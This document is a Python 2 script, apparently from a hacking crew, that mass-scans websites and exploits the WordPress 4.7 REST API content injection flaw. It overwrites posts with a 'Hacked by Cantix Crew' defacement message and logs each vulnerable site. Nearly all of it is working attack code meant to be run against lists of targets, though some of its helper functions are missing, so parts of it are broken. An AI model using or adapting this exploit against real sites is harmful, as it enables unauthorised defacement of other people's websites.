#!/usr/bin/python27
import os, re, sys, socket, binascii, time, json, random, threading
from Queue import Queue


try:
	import requests
except ImportError:
	print '---------------------------------------------------'
	print '[*] pip install requests'
	print ' [-] install requests Module first !'
	sys.exit()
	
class neng(object):
	def __init__(self):
		try:
			os.mkdir('result')
		except:
			pass
		try:
			os.mkdir('logs')
		except:
			pass
			
		self.r = '\033[31m'
		self.g = '\033[32m'
		self.y = '\033[33m'
		self.b = '\033[34m'
		self.m = '\033[35m'
		self.c = '\033[36m'
		self.w = '\033[37m'
		self.rr = '\033[39m'
		self.year = time.strftime("%y")
		self.month = time.strftime("%m")
		self.day = time.strftime("%d")
		
		try:
			self.select = sys.argv[1]
			
			if self.select == str('1'):  # Single
				self.cls()
				self.print_logo()
				self.Url = raw_input(self.r + '[*]' + self.c + 'Target: ' + self.y)
				print self.r + '--------------------------------------------'
				if self.Url.startswith("http://"):
					self.Url = self.Url.replace("http://", "")
				elif self.Url.startswith("https://"):
					self.Url = self.Url.replace("https://", "")
				else:
					pass
				try:
					CheckOsc = requests.get('http://' + self.Url + '/admin/images/cal_date_over.gif', timeout=10)
					CheckOsc2 = requests.get('http://' + self.Url + '/admin/login.php', timeout=10)
					CheckCMS = requests.get('http://' + self.Url + '/templates/system/css/system.css', timeout=5)
					Checktwo = requests.get('http://' + self.Url, timeout=5)
					if '/wp-content/' in Checktwo.text.encode('utf-8'):
						self.Print_Scanning(self.Url, 'Wordpress')
						self.wp_content_injection(self.Url)
					else:
						self.Print_Scanning(self.Url, 'Unknown')
				except:
					self.Timeout(self.Url)
					sys.exit()
	
	
			elif self.select == str('2'):  # multi List
				self.cls()
				self.print_logo()
				
				try:
					Get_list = raw_input(self.r + '[*]' + self.c + ' List Websites: ' + self.y)
					print self.r + '--------------------------------------------'
					with open(Get_list, 'r') as zz:
						Readlist = zz.read().splitlines()
				except IOError:
					print self.r + '--------------------------------------------'
					print self.r + '    [' + self.y + '-' + self.r + '] ' + self.c + ' List Not Found in Directory!'
					sys.exit()
				thread = []
				for xx in Readlist:
					t = threading.Thread(target=self.Work2, args=(xx, ''))
					t.start()
					thread.append(t)
					time.sleep(0.1)
				for j in thread:
					j.join()
			elif Get == str('n'):
				self.cls()
				self.print_logo()
				Loop = False
			else:
				self.exit()
		except:
			pass
				
	def Work2(self, url, s):
		try:
			if url.startswith("http://"):
				url = url.replace("http://", "")
			elif url.startswith("https://"):
				url = url.replace("https://", "")
			else:
				pass
				CheckOsc = requests.get('http://' + url + '/admin/images/cal_date_over.gif', timeout=10)
				CheckOsc2 = requests.get('http://' + url + '/admin/login.php', timeout=10)
				CheckCMS = requests.get('http://' + url + '/templates/system/css/system.css', timeout=5)
				Checktwo = requests.get('http://' + url, timeout=5)

				if '/wp-content/' in Checktwo.text.encode('utf-8'):
					self.wp_content_injection(url)
				else:
					self.FckEditor(url)
					self.q.task_done()
		except:
			pass
					
	def doWork(self):
		try:
			while True:
				url = self.q.get()
			if url.startswith('http://'):
				url = url.replace('http://', '')
			elif url.startswith("https://"):
				url = url.replace('https://', '')
			else:
				pass
			try:
				CheckOsc = requests.get('http://' + url + '/admin/images/cal_date_over.gif', timeout=10)
				CheckOsc2 = requests.get('http://' + url + '/admin/login.php', timeout=10)
				CheckCMS = requests.get('http://' + url + '/templates/system/css/system.css', timeout=5)
				Checktwo = requests.get('http://' + url, timeout=5)
				if '/wp-content/' in Checktwo.text.encode('utf-8'):
					self.wp_content_injection(url)
				else:
					self.FckEditor(url)
					self.q.task_done()
			except:
				pass
		except:
			pass
	
	
	
	def print_logo(self):
		clear = "\x1b[0m"
		colors = [33,34,32]
	
		x = """
	
	     \033[32m wordpress\033[34m     __    neng     __     ____        _           __  _           
	  _________  ____  / /____  ____  / /_   /  _/___    (_)__  _____/ /_(_)___  ____ 
	 / ___/ __ \/ __ \/ __/ _ \/ __ \/ __/   / // __ \  / / _ \/ ___/ __/ / __ \/ __ \
	 
	/ /__/ /_/ / / / / /_/  __/ / / / /_   _/ // / / / / /  __/ /__/ /_/ / /_/ / / / /
	\___/\____/_/ /_/\__/\___/_/ /_/\__/  /___/_/ /_/_/ /\___/\___/\__/_/\____/_/ /_/ 
	            \033[33mgithub.com/cantixcrew\033[34m              /___/                              	
	                       
	
	"""
		for N, line in enumerate(x.split("\n")):
			print(line)
			time.sleep(0.05)
	
	def Print_options(self):
		print self.w + '    [' + self.w + '1' + self.w + '] ' + self.r + 'Single Target' + self.w +\
		'     [ ' + 'python wpContentinjection.py 1' + ' ]'
		print self.w + '    [' + self.w + '2' + self.w + '] ' + self.c + 'List Scan' + self.w + '         [ ' + 'python wpContentinjection.py 2' + ' ]'
	
	
	
	def Print_Scanning(self, url, CMS):
		print self.c + ' [' + self.w + self.year + ':' + self.month + ':' + self.day + self.c + '] ' '[' + self.w + 'INFO' + self.c + '] ' + self.w + url + self.w + ' [ ' + CMS + ' ]'
	
	
	def Timeout(self, url):
		print self.c + ' [' + self.w + self.year + ':' + self.month + ':' + self.day + self.c + '] ' '[' + self.w + 'INFO' + self.c + '] ' + self.c + url + self.r + ' [ TimeOut!! ]'
	
	def Print_NotVuln(self, NameVuln, site):
		print self.c + ' [' + self.w + self.year + ':' + self.month + ':' + self.day + self.c + '] ' '[' + self.w + 'INFO' + self.c + '] ' + self.w + site + ' ' + self.c + NameVuln + self.r + ' [Not Vuln]'
	
	
	def Print_Vuln(self, NameVuln, site):
		print self.c + ' [' + self.w + self.year + ':' + self.month + ':' + self.day + self.c + '] ' '[' + self.w + 'INFO' + self.c + '] ' + self.g + site + ' ' + self.c + NameVuln + self.g + ' [Vuln!!]'
			
	
	def cls(self):
		linux = 'clear'
		windows = 'cls'
		os.system([linux, windows][os.name == 'nt'])
	
	
	def wp_content_injection(self, site):
    		try:
        		zaq = self.GetWordpressPostId(site)
        		headers = {'Content-Type': 'application/json'}
        		xxx = str(zaq) + 'bbx'
        		data = json.dumps({
            		'content': '<h1>Hacked by Rex4\n<p><title>Cantix Crew<br />\n</title></p></h1>\n<h5>gr3tz: Doraemon v1.5 - 4LM05TH3V!L - MR.L3RB1 - z3r00_c00d3r - Aero7 - PejuangMimpi<br>Sorong6etar1337 - Banyumas Cyber Team - Bandung6etar - Bandung Blackhat</h5>\n',
            		'title': 'Hacked by Cantix Crew',
            		'id': xxx,
            		'link': '/cans-htm',
            		'slug': '"/cans-htm"'
        		})
        		GoT = requests.post('http://' + site + '/wp-json/wp/v2/posts/' + str(zaq), data=data, headers=headers, timeout=10)
        		if GoT:
            			CheckIndex = 'http://' + site + '/cans.htm'
            			zcheck = requests.get(CheckIndex, timeout=10)
            			if 'Hacked!!' in zcheck.text:
                			self.Print_Vuln_index(site + '/cans.htm')
                			with open('result/Index_results.txt', 'a') as writer:
                    				writer.write(site + '/c.htm' + '\n')
            			else:
                			self.Print_NotVuln(self.y + '=> ' + self.c + 'Wordpress 4.7 Content Injection', site)
        		else:
            			self.Print_NotVuln(self.y + '=> ' + self.c + 'Wordpress 4.7 Content Injection', site)
    		except:
        		self.Print_NotVuln(self.y + '=> ' + self.c + 'Wordpress 4.7 Content Injection', site)

cantix = neng()
